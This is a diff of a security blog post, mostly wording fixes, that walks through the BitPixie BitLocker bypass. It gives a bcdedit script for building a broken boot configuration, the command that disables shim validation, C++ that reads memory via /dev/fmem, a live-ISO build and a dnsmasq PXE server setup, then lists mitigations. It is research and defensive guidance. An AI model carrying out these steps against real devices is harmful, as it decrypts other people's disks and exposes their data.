@@ -1,10 +1,11 @@
 ---
 title: Bypassing Bitlocker using BitPixie with any Linux Kernel
-date: 2025-12-09
+date: 2026-08-31
 description: Bitpixie allows on Systems using clear TPM to leak the bitlocker encryption key, by forcing a PXE boot to fail at a specific step and booting into anther operating system directly afterwards to read the RAM contents of the System.
 draft: false
 tags:
   - Bitlocker
+  - BitPixie
 toc: false
 authors:
   - Julian Engel
@@ -12,7 +13,7 @@ authors:
 
 ## Abstract
 
-Bitpixie allows on Systems using clear TPM to leak the bitlocker encryption key, by forcing a PXE boot to fail at a specific step and booting into anther operating system directly afterwards to read the RAM contents of the System.
+Bitpixie allows, on systems using clear TPM, to leak the bitlocker encryption key, by forcing a PXE boot to fail at a specific step and booting into anther operating system directly afterwards to read the RAM contents of the System.
 
 ## The Technical Basis for BitLocker and Bitpixie
 
@@ -20,11 +21,11 @@ To build an exploit means to understand the exploit. Thus, at first a small expl
 
 ### Demystifying Bitlocker and Secure boot
 
-Firstly Bitlocker, is Microsoft's device encryption that has been rolled out on all devices since [Windows 11 version 24H2](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-bitlocker#bitlocker-automatic-device-encryption-hardware-requirements). For the [home user](https://businesspcsupport.com/bitlocker-vs-device-encryption/) side it's called device encryption, on the corporate side it's called BitLocker. For simplicity's sake, this article will only be referring to it as BitLocker.
+Firstly, Bitlocker is Microsoft's device encryption that has been rolled out on all devices since [Windows 11 version 24H2](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-bitlocker#bitlocker-automatic-device-encryption-hardware-requirements). For private users it's called device encryption, in the corporate world it's called BitLocker. For simplicity's sake, this article will only be referring to it as BitLocker.
 
-BitLocker has two keys. First, it has the **VMK** (*Volume Master Key*), which is protected  TPM measurements and  optional security measures like PIN, password, smart card, etc.. With clear TPM referring to the configuration of only requiring the TPM to unseal the **VMK**.
+BitLocker has two keys. First, it has the **VMK** (*Volume Master Key*), which is protected TPM measurements and optional security measures like PIN, password, smart card, etc. With clear TPM referring to the configuration of only requiring the TPM to unseal the **VMK**.
 
-The disk is decrypted with the **FVEK** (*Full Volume Encryption Key*). Which is decrypted using the **VMK**.  This is also explained in some greater detail in one of the [Neodyme blog posts](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/#bitlocker-how-does-it-even-work).
+The disk is decrypted with the **FVEK** (*Full Volume Encryption Key*). Which is decrypted using the **VMK**. This is also explained in some greater detail in one of the [Neodyme blog posts](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/#bitlocker-how-does-it-even-work).
 
 ### What went wrong in case of Bitpixie
 
@@ -34,15 +35,15 @@ What went wrong in case of Bitpixie is straight forward: normally, if a boot-ste
 
 All following steps of the preparation except the Target preparation have to be done only once (with some slight modifications, that is).
 
-### Preparation of the  Target
+### Preparation of the Target
 
-These target preparations can be quickly done. Firstly, two USB sticks should be ready. One only needs enough capacity for maybe one megabyte, while the other one should  >8 GB USB 3.0. Though theoretically, both things could be done over the network.
+These target preparations can be quickly done. Firstly, two USB sticks should be ready. One only needs enough capacity for roughly one megabyte, while the other one should have more than 8 GB space and USB 3.0 support. Though theoretically, both things could be done over the network as well.
 
 #### Obtaining a working BCD file
 
-The easiest way to get the State needed for Bitpixie is using a BCD file. Since the GUID (*Globally Unique Identifier*) differs from hard drive to hard drive, a new BCD has to be obtained for every device that is to be attacked.
+The easiest way to get the state needed for Bitpixie is using a BCD file. Since the GUID (*Globally Unique Identifier*) differs from hard drive to hard drive, a new BCD has to be obtained for every device that is to be attacked.
 
-This can be  achieved by running the following script from the smaller USB Stick via the system rescue terminal on the victim PC. Thus not requiring a login. Though there are some [other approaches](https://github.com/andigandhi/bitpixie?tab=readme-ov-file#extracting-the-bcd-file) out there that use a network connection.
+This can be achieved by running the following script from the smaller USB Stick via the system rescue terminal on the victim PC. Thus not requiring a login. Though there are some [other approaches](https://github.com/andigandhi/bitpixie?tab=readme-ov-file#extracting-the-bcd-file) out there that use a network connection.
 
 ```batch
 bcdedit /export BCD_modded
@@ -64,13 +65,15 @@ bcdedit /store BCD_modded /displayorder {%REBOOT_GUID%} /addlast
 
 The script is taken from [the blog neodyme blog](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/#step-2-unlock-bitlocker-by-serving-a-correct-enough-boot-configuration).
 
-The following line sets the option for a softreboot meaning, that power to the RAM is not lost during the reboot, thus not clearing the VMK.
+##### Script breakdown
+
+The following line sets the option for a soft reboot, meaning that power to the RAM is not lost during the reboot, thus not clearing the VMK.
 
 ```batch
 bcdedit /store BCD_modded /set {%REBOOT_GUID%} pxesoftreboot yes
 ```
 
-For the Boot to fail the following line is needed. Since the path supplied is does not exists but still passes the validation. Thus leaving the BCD broken in a way that  forces the windows Bootloader to load the recovery option after unsealing the VMK from the TPM.
+For the Boot to fail the following line is needed. Since the path supplied is does not exists but still passes the validation. Thus leaving the BCD broken in a way that forces the windows Bootloader to load the recovery option after unsealing the VMK from the TPM.
 
 ```batch
 bcdedit /store BCD_modded /set {default} path "\\"
@@ -87,9 +90,9 @@ bcdedit /store BCD_modded /set {default} recoverysequence {%REBOOT_GUID%}
 
 #### Disabling SHIM verification
 
-This step allows one to boot any insecure kernel, without breaking the secure boot chain of trust and avoid getting an SBAT violation. First boot into a Linux distribution that has a signed SHIM from Microsoft.  Fedora would be one such option.
+This step allows one to boot any insecure kernel, without breaking the secure boot chain of trust and avoid getting an SBAT violation. First boot into a Linux distribution that has a signed SHIM from Microsoft. Fedora would be one such option.
 
-Once booted into the system, the following command needs to executed in a terminal:
+Once booted into the system, the following command needs to be executed in a terminal:
 
 ```shell
 sudo mokutil --disable-validation
@@ -97,11 +100,11 @@ sudo mokutil --disable-validation
 
 The password afterwards is only needed once, so a simple one to remember suffices.
 
-After setting the password a reboot is needed. A blue splash screen should appear with the title MOK Management(see [Ubuntu wiki](https://wiki.ubuntu.com/UEFI/SecureBoot/DKMS#:~:text=Open%20a%20terminal%20%28Ctrl%20%2B%20Alt%20%2B%20T%29%2C,had%20selected%20in%20Step%202%20and%20press%20Enter.) for screenshots), the Option to change the Secure boot state and then used to disable Secure boot in shim signed. Here the password is needed.
+After setting the password a reboot is needed. A blue splash screen should appear with the title MOK Management (see [Ubuntu wiki](https://wiki.ubuntu.com/UEFI/SecureBoot/DKMS#:~:text=Open%20a%20terminal%20%28Ctrl%20%2B%20Alt%20%2B%20T%29%2C,had%20selected%20in%20Step%202%20and%20press%20Enter.) for screenshots), the Option to change the Secure boot state and is then used to disable Secure boot in shim signed. Here the password is needed.
 
-This adds another step and some more possible traces, it makes the exploit simpler. By removing the need for a specific Linux Kernel,  as well as allowing the usage of tools like [GitHub - NateBrune/fmem: Linux Kernel](https://github.com/NateBrune/fmem), [GitHub - 504ensicsLabs/LiME: LiME](https://github.com/504ensicsLabs/LiME) or `/dev/Ram`.
+This adds another step and some more possible traces, which makes the exploit simpler. By removing the need for a specific Linux Kernel, as well as allowing the usage of tools like [GitHub - NateBrune/fmem: Linux Kernel](https://github.com/NateBrune/fmem), [GitHub - 504ensicsLabs/LiME: LiME](https://github.com/504ensicsLabs/LiME) or `/dev/Ram`.
 
-The traces left behind are NVRAm entries for  booting linux as well as the entry that disables SHIM validation if not re enabled.
+The traces left behind are NVRAM entries for booting linux as well as the entry that disables SHIM validation if not re enabled.
 
 The process to enable validation once again is the same as it was for disabling validation, just the command in Linux changes to :
 
@@ -191,7 +194,7 @@ file_descriptor.open("/dev/fmem", std::ios::in | std::ios::binary);
 size_t len= 2000000; //should be around 2MB
 size_t amount = 10
 
-char* buffer  = new char[len];
+char* buffer = new char[len];
 
 //...
 // simply iterating through memory to not overwrite the value, so its done in chunks
@@ -205,9 +208,9 @@ for(unsigned long long i = 0 ; i<amount; ++i){
 
 #### Building the Arch Linux based live System
 
-The info on how to build the arch ISO can be found in the wiki entry [archiso - ArchWiki](https://wiki.archlinux.org/title/Archiso). Running the following commands requires access to the Arch Repositories because the [archiso package](https://archlinux.org/packages/extra/any/archiso/) is used in this process.
+Information on how to build the arch ISO can be found in the wiki entry [archiso - ArchWiki](https://wiki.archlinux.org/title/Archiso). Running the following commands requires access to the Arch Repositories because the [archiso package](https://archlinux.org/packages/extra/any/archiso/) is used in this process.
 
-Once the package is  installed, a copy of the base image into a working directory so that the following modifications can happen. The relang base image is used as a base image.
+Once the package is installed, a copy of the base image into a working directory so that the following modifications can happen. The relang base image is used as a base image.
 
 ```shell
 cp -r /usr/share/archiso/configs/releng/ archlive
@@ -222,7 +225,7 @@ makepkg
 repo-add -n fmem.db.tar.xz *.pkg.tar
 ```
 
-First building the package and then creating a Repository based on that package.
+First build the package and then creat a repository based on that package.
 
 ##### Pacman Config
 
@@ -253,14 +256,14 @@ Server= file://<full path from / to that specific Direcotry inside the arch iso>
 
 ##### Initramfs customization
 
-To make the installed tools available in the initramFS the following file needed some modifications `$WorkingDir/relang/airootfs/etc/mkinitcpio.conf.d/archiso.conf` so that it contains these changes.
+To make the installed tools available in the initramfs the following file needed some modifications `$WorkingDir/relang/airootfs/etc/mkinitcpio.conf.d/archiso.conf` so that it contains these changes.
 
 ```
 MODULES=(fmem)
 BINARIES=(dislocker /etc/<name of the exploit binary>)
 ```
 
-The first line will add the fmem kernel module, and the second line, the dislocker binary as well as the exploitation binary. The path of the exploit binary is relative inside the ISO, so  the paths is relative to the `/etc/` in the working directory! Not the global `/etc/`!
+The first line will add the fmem kernel module, and the second line, the dislocker binary as well as the exploitation binary. The path of the exploit binary is relative inside the ISO, so the paths is relative to the `/etc/` in the working directory! Not the global `/etc/`!
 
 ### Preparing the attacker setup
 
@@ -270,22 +273,22 @@ Once again the recommendation is to use a Linux system.
 #### Obtaining an outdated Windows Bootloader
 
 Since the exploit is patched in newer versions, there is a need to obtain an old, vulnerable bootloader. One way to obtain an old, vulnerable ISO and extract the files needed. A list of vulnerable versions can be found in the [advisory](https://nvd.nist.gov/vuln/detail/CVE-2023-21563).
-To extract the files the ISO can either be mounted locally or Software that allows extracting files from ISO's can be used.
+To extract the files the ISO can either be mounted locally or software that allows extracting files from ISO's can be used.
 
-The file `bootmgfw.efi` can be found as `bootx64.efi` under `windows-mount-location/efi/boot/` and needs to be renamed to `bootmgfw.efi` and the  `bootmgr.efi` file can be found under `windows-mount-location/bootmgr.efi`.
+The file `bootmgfw.efi` can be found as `bootx64.efi` under `windows-mount-location/efi/boot/` and needs to be renamed to `bootmgfw.efi` and the `bootmgr.efi` file can be found under `windows-mount-location/bootmgr.efi`.
 
-Optionally one can also obtain some fonts, that make debugging in certain cases a bit easier, but strictly speaking they are not needed. The fonts in question would be `wgl4_boot.ttf` as well as `segoe_slboot.ttf` as suggested in [this public bitpixie exploit by  Andreas Grasser](https://github.com/andigandhi/bitpixie/tree/main/pxe-server).  Alternatively the entire ISO could be extracted into the TFTP-root.
+Optionally one can also obtain some fonts, that make debugging in certain cases a bit easier, but strictly speaking they are not needed. The fonts in question would be `wgl4_boot.ttf` as well as `segoe_slboot.ttf` as suggested in [this public bitpixie exploit by Andreas Grasser](https://github.com/andigandhi/bitpixie/tree/main/pxe-server). Alternatively the entire ISO could be extracted into the TFTP-root.
 
 #### Server Setup
 
-As a PXE server  `dnsmasq` is used, since it has all the needed functionality.
+As a PXE server `dnsmasq` is used, since it has all the needed functionality.
 
 ##### DNSMASQ Config
 
 The Dnsmasq config could look as follows. The interface address and the path to the TFTP-root have to be adapted to suit the specific setup. Other than that, no other modifications are needed.
 
 ```bash
-# Only listen to routers' LAN NIC.  Doing so opens up tcp/udp port 53 to localhost and udp port 67 to world:
+# Only listen to routers' LAN NIC. Doing so opens up tcp/udp port 53 to localhost and udp port 67 to world:
 interface=<your ethernet Interface >
 
 # dnsmasq will open tcp/udp port 53 and udp port 67 to world to help with dynamic interfaces (assigning dynamic IPs).
@@ -380,7 +383,7 @@ sudo dnsmasq -d
 
 The `-q` flag lets dnsmasq run as a non-demonized service so that it is easier to see problems in the setup.
 
-Since the service is now running the Victim can be PXE booted, to run the exploit.If this cannot be done via the BIOS (because of a BIOS password is set or similar), one can simply boot into Windows Recovery by holding down the shift key while pressing on reboot on the Windows login screen. From there, one simply has to select the PXE in the alternative boot medium selection screen.
+Since the service is now running the Victim can be PXE booted, to run the exploit. If this cannot be done via the BIOS (because of a BIOS password is set or similar), one can simply boot into Windows Recovery by holding down the shift key while pressing on reboot on the Windows login screen. From there, one simply has to select the PXE in the alternative boot medium selection screen.
 
 Once the initramfs has loaded, the fmem kernel module has to be loaded with the following command.
 
@@ -409,8 +412,8 @@ If Microsoft's recommendation for protection against an [attacker with skill and
 
 Pre-boot authentication is one of the most effective methods to protect against outside decryption attacks against a laptop. Since this also prevents an attack from other possible BitLocker bypasses, such as unscrewing the lid and [sniffing the TPM](https://pulsesecurity.co.nz/articles/TPM-sniffing) communication with the CPU. It is also what Microsoft [recommends](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/countermeasures#preboot-authentication) against DMA (Direct Memory Access) and memory remanence attacks.
 
-Otherwise, deploying [KB5025885](https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines) is also an option that would prevent Bitpixie. What this mitigation does is first add the "Windows UEFI CA 2023" to the trusted certificates in the motherboard database. After that is done, it adds the "Windows Production PCA 2011" certificate to the revocation list, thus not allowing the downgrade attack and preventing this attack as a whole. While doing this, one should, of course, make sure that their bootloader is already signed with the newer certificate and not with the old one.  The [mitigation post from Microsoft](https://support.microsoft.com/en-us/topic/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines) goes into greater detail on how to apply this patch.
+Otherwise, deploying [KB5025885](https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines) is also an option that would prevent Bitpixie. What this mitigation does is first add the "Windows UEFI CA 2023" to the trusted certificates in the motherboard database. After that is done, it adds the "Windows Production PCA 2011" certificate to the revocation list, thus not allowing the downgrade attack and preventing this attack entirely. While doing this, one should, of course, make sure that their bootloader is already signed with the new certificate and not with the old one. The [mitigation post from Microsoft](https://support.microsoft.com/en-us/topic/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines) goes into greater detail on how to apply this patch.
 
-Theoretically, one could also disable the network stack and PXE boot, that would also prevent BitPixie. Though some motherboards seem to reactivate PXE boot as soon as a USB-to-Ethernet adapter is connected. Hence, making this in some cases by passable. But This has been  [reported](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/#mitigation) , but is highly dependent on hardware and thus is not always the case.
+Theoretically, one could also disable the network stack and PXE boot, that would also prevent BitPixie. Though some motherboards seem to reactivate PXE boot as soon as a USB-to-Ethernet adapter is connected. Hence, making this in some cases bypassable. While this has been [reported](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/#mitigation), it is highly dependent on hardware and thus is not always the case.
 
 What does not fix the problem is simply deactivating third-party certificates in the BIOS so that a SHIM won't load, and only Microsoft Windows can be booted. Even though this implementation uses Linux to read out the RAM, other people have also done the same with a [Windows PE environment,](https://github.com/martanne/bitpixie) completely bypassing the need to use a third-party Microsoft certificate. Hence, making this venue of defense not viable. A blog post written about this can also be found on [Marc Tanner's blog](https://blog.compass-security.com/2025/05/bypassing-bitlocker-encryption-bitpixie-poc-and-winpe-edition/).
